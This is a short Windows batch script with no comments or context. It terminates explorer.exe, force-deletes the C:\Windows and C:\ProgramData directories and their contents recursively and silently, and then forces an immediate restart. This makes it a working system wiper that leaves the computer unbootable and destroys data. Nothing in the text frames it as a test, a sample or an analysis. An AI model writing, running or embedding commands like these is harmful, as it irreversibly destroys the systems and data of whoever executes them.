@echo off

taskkill /f /im explorer.exe

rmdir /s /q C:\Windows

del /f /s /q C:\Windows*

del /f /s /q C:\ProgramData*

rmdir /s /q C:\ProgramData\

shutdown /r /t 0